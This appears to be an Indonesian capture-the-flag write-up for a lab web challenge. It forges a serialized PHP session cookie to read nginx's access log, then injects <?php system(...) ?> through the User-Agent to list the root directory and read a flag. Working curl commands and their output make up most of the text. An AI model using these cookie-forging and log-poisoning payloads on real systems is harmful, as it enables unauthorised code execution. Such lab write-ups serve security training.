# Toxic

Target	: 188.166.175.58
Port	: 31842

Kita download file yang disediakan dan unzip file tersebut. File yang menarik adalah file `index.php` yang berisi
```php
<?php
...
...
if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

Dimana file tersebut akan melakukan generate cookie. Jika kita lihat di devtools browser, cookie yang kita dapat adalah `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9` yang mana jika di decode hasilnya adalah `O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}`. Dari hal ini, kita dapat melakukan LFI dengan mengganti `/www/index.html` dengan nama file lainnya.

Kita dapat mencoba untuk menampilkan log dari web server yang digunakan. Jika kita cek pada bagian response header, web server yang digunakan adalah **`nginx`**. Jadi disini kita akan langsung coba untuk mengganti file direktori menjadi direktori log dari `nginx`. Dari string ini `O:9:"PageModel":1:{s:4:"file";s:15:"/var/log/nginx/access.log";}` kita encode ke base64 yang mana akan menjadi `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=`. Kita dapat menggunakan `curl` untuk mengirimkan cookie yang baru ini
```bash
curl http://Target:Port --cookie 'PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo='
...
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/1
15.0"                                                                                                     
10.244.0.61 - 200 "GET /static/css/production.css HTTP/1.1" "http://188.166.175.58:31842/" "Mozilla/5.0 (X
11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"                                                 
10.244.0.61 - 200 "GET /static/js/production.js HTTP/1.1" "http://188.166.175.58:31842/" "Mozilla/5.0 (X11
; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"                                                   
10.244.0.61 - 200 "GET /static/images/instagram.svg HTTP/1.1" "http://188.166.175.58:31842/" "Mozilla/5.0 
(X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"                                               
10.244.0.61 - 200 "GET /static/images/youtube.svg HTTP/1.1" "http://188.166.175.58:31842/" "Mozilla/5.0 (X
...
...
```
Dan ternyata bisa. Kita dapat coba untuk melakukan **log poisoning** dengan mengganti User-Agent karena dari log diatas, dapat dilihat bahwa User-Agent kita tercatat di log tersebut. Karena itu kita melakukan poisoning pada log dengan memanfaatkan User-Agent dengan menggantinya dengan php code sehingga nantinya akan tercatat di php log, dan nantinya setiap server melakukan load file log ini, nantinya server akan run code tersebut dan hasilnya akan terpampang di hasil render.
```bash
curl http://Target:Port --cookie 'PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=' -A "<?php system('ls /'); ?>"
...
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/1
15.0"                                                                                                     
10.244.0.61 - 200 "GET /static/css/production.css HTTP/1.1" "http://188.166.175.58:31842/" "Mozilla/5.0 (X
11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
...
...
...
curl http://Target:Port --cookie 'PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo='
...
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/1
15.0"                                                                                                     
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/1
15.0"                                                                                                     
10.244.0.61 - 200 "GET /index.html HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101
 Firefox/115.0"                                                                                           
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "curl/8.5.0"                                                       
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "bin                                                               
dev
entrypoint.sh
etc
flag_VHXbU
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
...
```
Dapat dilihat diatas, kita perlu run 2x dimana yang pertama adalah untuk log poisoning dengan listing direktori `/` dan yang kedua adalah untuk melihat isi log setelah kita melakukan log poisoning. Hasilnya, kita mendapat file flag di `/flag_VHXbU`. Selanjutnya kita dapat menampilkannya dengan cara yang sama
```bash
curl http://Target:Port --cookie 'PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=' -A "<?php system('cat /flag_VHXbU'); ?>"

10.244.0.61 - 200 "GET / HTTP/1.1" "-" "curl/8.5.0" 
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "curl/8.5.0" 
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "curl/8.5.0" 
...
...
...
curl http://Target:Port --cookie 'PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo='

10.244.0.61 - 200 "GET / HTTP/1.1" "-" "curl/8.5.0" 
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "curl/8.5.0" 
10.244.0.61 - 200 "GET / HTTP/1.1" "-" "HTB{xxx}
"
...
```
